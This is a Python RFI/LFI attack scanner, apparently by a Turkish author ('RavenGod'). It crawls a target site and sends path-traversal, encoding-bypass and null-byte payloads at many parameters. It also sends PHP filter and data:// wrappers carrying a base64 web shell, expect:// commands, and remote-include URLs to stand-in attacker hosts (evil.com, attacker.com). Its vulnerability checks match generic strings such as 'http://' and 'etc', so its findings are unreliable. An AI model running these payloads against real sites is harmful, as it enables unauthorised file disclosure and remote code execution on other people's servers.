#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 RFI/LFI Tester Scanner 
yazan: RavenGod #dayı izinsiz ortamlarda kullanmayın 
"""

import requests
import urllib.parse
import time
import sys
import random
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import init, Fore, Back, Style

# Colorama başlat
init(autoreset=True)

class AdvancedRFILFITester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.base_url = self.get_base_url(target_url)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Crawl edilen URL'leri takip et
        self.crawled_urls = set()
        self.discovered_params = set()
        self.vulnerable_found = []
        
        # Gelişmiş LFI payload'ları
        self.lfi_payloads = [
            # Linux/Unix
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "/etc/passwd",
            "etc/passwd",
            "passwd",
            
            # Windows
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts",
            "windows\\system32\\drivers\\etc\\hosts",
            
            # PHP Wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
            
            # Data wrapper
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFtjXSkpOz8+",
            
            
            "file:///etc/passwd",
            "file:///C:/Windows/System32/drivers/etc/hosts",
            
            # Null byte injection
            "../../../etc/passwd%00",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
            
          
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%255C..%255C..%255Cwindows%255Csystem32%255Cdrivers%255Cetc%255Chosts"
        ]
        
        
        self.rfi_payloads = [
            # HTTP/HTTPS
            "http://evil.com/shell.txt",
            "https://raw.githubusercontent.com/evil/shell/master/shell.php",
            "http://attacker.com/shell.php",
            "https://pastebin.com/raw/abc123",
            
            # FTP
            "ftp://evil.com/shell.txt",
            "ftp://attacker.com/shell.php",
            
            # PHP Wrappers
            "php://input",
            "php://filter/convert.base64-encode/resource=http://evil.com/shell.txt",
            
            # Data wrapper
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFtjXSkpOz8+",
            
            # Expect wrapper
            "expect://id",
            "expect://whoami",
            "expect://cat /etc/passwd",
            
            # Input wrapper
            "input://id",
            "input://whoami",
            
            # Filter wrapper
            "php://filter/convert.base64-encode/resource=http://evil.com/shell.txt",
            
            # ZIP wrapper
            "zip://shell.jpg%23shell.php",
            "zip://shell.zip%23shell.php",
            
            # Phar wrapper
            "phar://shell.phar/shell.php",
            
            # OLE wrapper
            "phar://shell.phar/shell.php"
        ]
        
        # Temel test parametreleri
        self.base_params = [
            'file', 'page', 'include', 'path', 'doc', 'folder', 'root', 'pg', 
            'article', 'id', 'item', 'cat', 'category', 'view', 'content', 
            'dir', 'directory', 'name', 'filename', 'pathname', 'include_path', 
            'script', 'template', 'theme', 'skin', 'style', 'css', 'js', 
            'img', 'image', 'media', 'download', 'upload', 'filepath', 
            'lang', 'language', 'locale', 'country', 'region', 'city',
            'user', 'username', 'profile', 'account', 'member', 'admin',
            'config', 'setting', 'option', 'pref', 'preference', 'param',
            'variable', 'var', 'data', 'info', 'information', 'detail',
            'section', 'part', 'component', 'module', 'plugin', 'extension',
            'addon', 'widget', 'gadget', 'tool', 'utility', 'function',
            'method', 'action', 'task', 'job', 'work', 'operation',
            'process', 'procedure', 'routine', 'subroutine', 'handler',
            'controller', 'manager', 'service', 'daemon', 'agent', 'bot'
        ]
        
        # Test edilen parametreleri takip et
        self.tested_params = set()
        
    def get_base_url(self, url):
        """URL'den base URL'i çıkar"""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
        
    def crawl_page(self, url, depth=0, max_depth=3):
        """Sayfayı crawl et ve parametreleri bul"""
        if depth > max_depth or url in self.crawled_urls:
            return
            
        self.crawled_urls.add(url)
        
        try:
            print(f"{Fore.CYAN}[🕷️] Crawling: {url}")
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                # HTML parse et
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Link'leri bul
                links = soup.find_all('a', href=True)
                forms = soup.find_all('form')
                
                # Parametreleri bul
                self.extract_params_from_url(url)
                self.extract_params_from_forms(forms)
                
                # Yeni link'leri crawl et
                if depth < max_depth:
                    for link in links[:10]:  # İlk 10 link'i al
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        # Sadece aynı domain'deki link'leri crawl et
                        if self.base_url in full_url and full_url not in self.crawled_urls:
                            time.sleep(0.5)  # Rate limiting
                            self.crawl_page(full_url, depth + 1, max_depth)
                            
        except Exception as e:
            print(f"{Fore.RED}[💥] Crawl error for {url}: {str(e)}")
            
    def extract_params_from_url(self, url):
        """URL'den parametreleri çıkar"""
        try:
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params.keys():
                    self.discovered_params.add(param)
                    print(f"{Fore.GREEN}[🔍] Found parameter: {param}")
        except Exception as e:
            pass
            
    def extract_params_from_forms(self, forms):
        """Form'lardan parametreleri çıkar"""
        for form in forms:
            inputs = form.find_all('input')
            for inp in inputs:
                name = inp.get('name')
                if name:
                    self.discovered_params.add(name)
                    print(f"{Fore.GREEN}[🔍] Found form parameter: {name}")
                    
            # Select ve textarea'ları da kontrol et
            selects = form.find_all('select')
            for select in selects:
                name = select.get('name')
                if name:
                    self.discovered_params.add(name)
                    print(f"{Fore.GREEN}[🔍] Found select parameter: {name}")
                    
            textareas = form.find_all('textarea')
            for textarea in textareas:
                name = textarea.get('name')
                if name:
                    self.discovered_params.add(name)
                    print(f"{Fore.GREEN}[🔍] Found textarea parameter: {name}")
                    
    def smart_crawl_and_scan(self):
        """Akıllı crawl ve scan"""
        print(f"{Fore.CYAN}[🚀] Starting SMART CRAWL & SCAN...\n")
        
        # 1. Ana sayfayı crawl et
        print(f"{Fore.YELLOW}[📋] Phase 1: Crawling target for parameters...")
        self.crawl_page(self.target_url)
        
        # 2. Keşfedilen parametreleri ekle
        all_params = list(set(self.base_params + list(self.discovered_params)))
        print(f"\n{Fore.GREEN}[✅] Total parameters to test: {len(all_params)}")
        print(f"{Fore.GREEN}[✅] Discovered parameters: {len(self.discovered_params)}")
        print(f"{Fore.GREEN}[✅] Base parameters: {len(self.base_params)}")
        
        # 3. Her parametre için test et
        random.shuffle(all_params)
        
        for i, param in enumerate(all_params, 1):
            if param in self.tested_params:
                continue
                
            print(f"\n{Fore.MAGENTA}[📋] Testing parameter {i}/{len(all_params)}: {Fore.CYAN}{param}")
            
            # LFI testleri - sadece birkaç payload ile test et
            lfi_tested = False
            for payload in random.sample(self.lfi_payloads, min(5, len(self.lfi_payloads))):
                if self.test_lfi_advanced(param, payload):
                    lfi_tested = True
                    break
                    
            # RFI testleri - sadece birkaç payload ile test et
            rfi_tested = False
            for payload in random.sample(self.rfi_payloads, min(5, len(self.rfi_payloads))):
                if self.test_rfi_advanced(param, payload):
                    rfi_tested = True
                    break
                    
            # Eğer her iki test de başarısızsa, parametreyi işaretle
            if not lfi_tested and not rfi_tested:
                self.tested_params.add(param)
                
            print(f"{Fore.CYAN}{'─'*60}")
            time.sleep(0.3)  # Rate limiting
            
        return self.vulnerable_found
        
    def print_banner(self):
        # Banner artık main'de gösteriliyor, burada sadece target URL'i göster
        print(f"{Fore.CYAN}[🎯] Target URL: {Fore.GREEN}{self.target_url}")
        print(f"{Fore.CYAN}{'═'*70}\n")
        
    def test_lfi_advanced(self, param, payload):
        if param in self.tested_params:
            return False
            
        try:
            # URL encode payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Test URL oluştur
            test_url = f"{self.target_url}?{param}={encoded_payload}"
            
            print(f"{Fore.BLUE}[🔍] Testing LFI: {Fore.CYAN}{param}={Fore.WHITE}{payload}")
            
            # Request gönder
            response = self.session.get(test_url, timeout=15)
            
            # Response analiz et
            if response.status_code == 200:
                content = response.text.lower()
                content_length = len(response.text)
                
                # Gelişmiş LFI detection
                lfi_indicators = [
                    'root:', 'bin:', 'daemon:', 'sys:', 'adm:', 'uid=', 'gid=', 
                    'home:', 'shell:', 'c:\\windows', 'system32', 'drivers', 'etc',
                    'administrator', 'guest', 'nobody', 'mysql', 'apache', 'www-data',
                    'bin/bash', 'bin/sh', '/bin/bash', '/bin/sh', 'c:\\windows\\system32',
                    'windows nt', 'microsoft corporation', 'hosts file', 'localhost',
                    '127.0.0.1', '::1', 'fe80::', 'ff00::', 'ff02::'
                ]
                
                # LFI başarılı mı kontrol et
                if any(indicator in content for indicator in lfi_indicators):
                    print(f"{Fore.GREEN}[✅] LFI VULNERABLE! {param}={payload}")
                    print(f"{Fore.YELLOW}   📊 Response length: {content_length}")
                    print(f"{Fore.YELLOW}   🔗 Test URL: {test_url}")
                    
                    # Response'dan örnek al
                    sample = content[:200] + "..." if len(content) > 200 else content
                    print(f"{Fore.CYAN}   📝 Sample response: {sample}")
                    
                    self.vulnerable_found.append(f"LFI: {param}={payload}")
                    self.tested_params.add(param)
                    return True
                else:
                    print(f"{Fore.RED}[❌] LFI not vulnerable for {param}")
                    
            elif response.status_code == 500:
                print(f"{Fore.YELLOW}[⚠️] HTTP 500 (Server Error) - Potential vulnerability!")
                print(f"{Fore.YELLOW}   🔗 Test URL: {test_url}")
                
            else:
                print(f"{Fore.RED}[❌] HTTP {response.status_code} for {param}")
                
        except requests.exceptions.Timeout:
            print(f"{Fore.YELLOW}[⏰] Timeout for {param}")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[🔌] Connection error for {param}")
        except Exception as e:
            print(f"{Fore.RED}[💥] Error testing LFI {param}: {str(e)}")
            
        return False
        
    def test_rfi_advanced(self, param, payload):
        if param in self.tested_params:
            return False
            
        try:
            print(f"{Fore.BLUE}[🔍] Testing RFI: {Fore.CYAN}{param}={Fore.WHITE}{payload}")
            
            # Test URL oluştur
            test_url = f"{self.target_url}?{param}={payload}"
            
            # Request gönder
            response = self.session.get(test_url, timeout=15)
            
            if response.status_code == 200:
                content = response.text.lower()
                content_length = len(response.text)
                
                # Gelişmiş RFI detection
                rfi_indicators = [
                    'evil.com', 'raw.githubusercontent.com', 'attacker.com', 'pastebin.com',
                    'ftp://', 'data://', 'php://', 'expect://', 'input://', 'zip://', 'phar://',
                    'ole://', 'filter://', 'glob://', 'file://', 'http://', 'https://',
                    'include_path', 'allow_url_include', 'allow_url_fopen', 'open_basedir'
                ]
                
                # RFI başarılı mı kontrol et
                if any(indicator in content for indicator in rfi_indicators):
                    print(f"{Fore.GREEN}[✅] RFI VULNERABLE! {param}={payload}")
                    print(f"{Fore.YELLOW}   📊 Response length: {content_length}")
                    print(f"{Fore.YELLOW}   🔗 Test URL: {test_url}")
                    
                    # Response'dan örnek al
                    sample = content[:200] + "..." if len(content) > 200 else content
                    print(f"{Fore.CYAN}   📝 Sample response: {sample}")
                    
                    self.vulnerable_found.append(f"RFI: {param}={payload}")
                    self.tested_params.add(param)
                    return True
                else:
                    print(f"{Fore.RED}[❌] RFI not vulnerable for {param}")
                    
            elif response.status_code == 500:
                print(f"{Fore.YELLOW}[⚠️] HTTP 500 (Server Error) - Potential vulnerability!")
                print(f"{Fore.YELLOW}   🔗 Test URL: {test_url}")
                
            else:
                print(f"{Fore.RED}[❌] HTTP {response.status_code} for {param}")
                
        except requests.exceptions.Timeout:
            print(f"{Fore.YELLOW}[⏰] Timeout for {param}")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[🔌] Connection error for {param}")
        except Exception as e:
            print(f"{Fore.RED}[💥] Error testing RFI {param}: {str(e)}")
            
        return False
        
    def run(self):
        self.print_banner()
        
        print(f"{Fore.YELLOW}[📊] Scan Statistics:")
        print(f"{Fore.YELLOW}   • Base parameters: {len(self.base_params)}")
        print(f"{Fore.YELLOW}   • Total LFI payloads: {len(self.lfi_payloads)}")
        print(f"{Fore.YELLOW}   • Total RFI payloads: {len(self.rfi_payloads)}")
        print()
        
        start_time = time.time()
        vulnerable_params = self.smart_crawl_and_scan()
        end_time = time.time()
        
        # Sonuçları göster
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.YELLOW}📊 FINAL SCAN RESULTS")
        print(f"{Fore.CYAN}{'═'*70}")
        
        if vulnerable_params:
            print(f"{Fore.GREEN}[✅] Found {len(vulnerable_params)} vulnerabilities:")
            for i, vuln in enumerate(vulnerable_params, 1):
                print(f"{Fore.GREEN}   {i}. {vuln}")
        else:
            print(f"{Fore.RED}[❌] No vulnerabilities found")
            print(f"{Fore.YELLOW}[💡] Target might be secure or using WAF protection")
            
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.YELLOW}⏱️  Scan completed in {end_time - start_time:.2f} seconds")
        print(f"{Fore.YELLOW}🎯 Tested {len(self.tested_params)} unique parameters")
        print(f"{Fore.CYAN}{'═'*70}")

def main():
    # Banner'ı ilk açılışta göster
    print(f"""
{Fore.CYAN}░█████████                                                ░██████                    ░██ 
░██     ░██                                              ░██   ░██                   ░██ 
░██     ░██  ░██████   ░██    ░██  ░███████  ░████████  ░██         ░███████   ░████████ 
░█████████        ░██  ░██    ░██ ░██    ░██ ░██    ░██ ░██  █████ ░██    ░██ ░██    ░██ 
░██   ░██    ░███████   ░██  ░██  ░█████████ ░██    ░██ ░██     ██ ░██    ░██ ░██    ░██ 
░██    ░██  ░██   ░██    ░██░██   ░██        ░██    ░██  ░██  ░███ ░██    ░██ ░██   ░███ 
░██     ░██  ░█████░██    ░███     ░███████  ░██    ░██   ░█████░█  ░███████   ░█████░██ 

{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════════════╗
{Fore.RED}║                          RFI/LFI Tester Scanner                                      ║
{Fore.RED}║                              yazan: RavenGod                                         ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════════════╝
""")
    
    # URL'i kullanıcıdan al
    print(f"{Fore.YELLOW}[🎯] Enter target URL:")
    print(f"{Fore.CYAN}   Example: http://example.com/page.php")
    print(f"{Fore.CYAN}   Example: testphp.vulnweb.com/artists.php?artist=1")
    print()
    
    target_url = input(f"{Fore.GREEN}[🔗] Target URL: {Fore.WHITE}").strip()
    
    if not target_url:
        print(f"{Fore.RED}[❌] No URL provided. Exiting...")
        sys.exit(1)
    
    # URL formatını kontrol et
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
        
    print(f"\n{Fore.CYAN}[🚀] Starting scan against: {Fore.GREEN}{target_url}")
    print(f"{Fore.CYAN}{'═'*70}\n")
        
    try:
        tester = AdvancedRFILFITester(target_url)
        tester.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Scan interrupted by user (Ctrl+C)")
    except Exception as e:
        print(f"{Fore.RED}[💥] Critical Error: {str(e)}")

if __name__ == "__main__":
    main()
